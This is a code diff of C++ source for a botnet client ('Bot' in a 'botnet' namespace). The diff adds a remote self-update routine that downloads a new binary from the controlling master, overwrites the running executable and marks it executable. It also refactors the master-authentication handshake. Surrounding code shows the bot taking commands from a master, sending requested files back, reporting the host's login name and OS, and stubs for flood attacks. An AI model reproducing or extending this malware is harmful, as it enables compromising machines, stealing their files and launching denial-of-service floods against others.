@@ -1,5 +1,6 @@
 #include "Bot.h"
 #include "TCPFunctions.h"
+#include "../defines.h"
 
 #include <limits.h>
 #include <iostream>
@@ -11,7 +12,7 @@
 using namespace botnet;
 
 // Init the server connection on port 0 to automaticly choose free port
-Bot::Bot() : server_connection(0) {
+Bot::Bot() : server_connection(0), continue_running(true) {
 	
 }
 
@@ -30,7 +31,7 @@ void Bot::ListenToMaster() {
 
 	std::string master_message;
 	int retv = 0;
-	while (1) {
+	while (this->continue_running) {
 		// Wait for command from master
 		retv = this->server_connection.Recv(master_message, sizeof(char));
 
@@ -46,7 +47,7 @@ void Bot::ListenToMaster() {
 		}
 		// If master cut connection, quit
 		else if (retv == 0) {
-			break;
+			this->continue_running = false;
 		}
 	}
 }
@@ -61,18 +62,17 @@ void Bot::FlushIncoming() {
 }
 
 bool Bot::AuthenticateServer() {
-	static const std::string expected_server_auth = "666";
-	static const std::string answer = "999";
+	// alias AUTH_LEN for esthetic of code
+	static const int auth_len = botnet_defines::AUTH_LEN;
+
 	std::string server_auth;
 
 	int try_cnt = 0;
 
-	int retv = this->server_connection.Recv(server_auth, expected_server_auth.length());
-	if (retv == static_cast<int>(expected_server_auth.length()) &&
-		server_auth == expected_server_auth)
-	{
+	int retv = this->server_connection.Recv(server_auth, auth_len);
+	if (retv == auth_len && server_auth == botnet_defines::SERVER_AUTH)	{
 		while (try_cnt < 3) {
-			if (this->server_connection.Send(answer) == static_cast<int>(answer.length())) {
+			if (this->server_connection.Send(botnet_defines::BOT_AUTH) == auth_len) {
 				return true;
 			}
 			try_cnt++;
@@ -164,9 +164,7 @@ void Bot::GetFile() {
 
 		this->server_connection.Send(file_content);
 	}
-
 }
-
 
 void Bot::StopFlood() {
 	;
@@ -187,14 +185,77 @@ void Bot::GetInfo() {
 		info += std::string("Login Name: ") + pass->pw_name + "\n";
 	}
 	
-	else {
-		std::cout << errno << ": "<< std::string(strerror(errno)) << std::endl;
-	}
-
 	info += "OS: " + this->GetOsName() + "\n";
 
 
 	this->server_connection.Send(info);
+}
+
+void Bot::UpdateBot() {
+	
+	static const std::string tmp_file_path = "BotUpdate.dnr";
+
+	std::ofstream tmp_bot_file;
+	char bot_file_path[PATH_MAX] = { 0 };
+
+	// Get path of running bot
+	if (readlink("/proc/self/exe", bot_file_path, PATH_MAX) == -1) {
+		this->FlushIncoming();
+		return;
+	}
+
+	tmp_bot_file.open(tmp_file_path, std::ios::binary | std::ios::out | std::ios::trunc);
+	if (tmp_bot_file.bad()) {
+		// Cleanup
+		this->FlushIncoming();
+		remove(tmp_file_path.c_str());
+		return;
+	}
+
+	// Start receiving file from bot
+	static const int    MAX_CHUNK = 5*1024; // 5kb at a time	
+	static const double TIMEOUT   = 5;
+
+	std::string file_content;
+	uint32_t    left_to_read = 0;
+	int         retv         = 0;
+
+	retv = this->server_connection.Recv(&left_to_read, sizeof(left_to_read), TIMEOUT);
+
+	if (retv != sizeof(left_to_read)) {
+		// Cleanup
+		this->FlushIncoming();
+		remove(tmp_file_path.c_str());
+		this->continue_running = (retv != 0);
+		return;
+	}
+	
+	left_to_read = ntohl(left_to_read);
+
+	while (left_to_read > 0) {
+		retv = this->server_connection.Recv(file_content, MAX_CHUNK, TIMEOUT);
+
+		if (retv <= 0) {
+			// Cleanup
+			this->FlushIncoming();
+			remove(tmp_file_path.c_str());
+			this->continue_running = (retv != 0);
+			return;
+		}
+
+		tmp_bot_file << file_content;
+		left_to_read -= file_content.size();
+	}
+
+	static const char update_successful = 'Y';
+
+	// If update not successful, don't send confirmation
+	if (rename(tmp_file_path.c_str(), bot_file_path) == 0) {
+		this->server_connection.Send(&update_successful, sizeof(update_successful));
+		chmod(bot_file_path, S_IRUSR | S_IWUSR | S_IXUSR | S_IXGRP | S_IXOTH);
+	}
+
+	remove(tmp_file_path.c_str());
 }
 
 
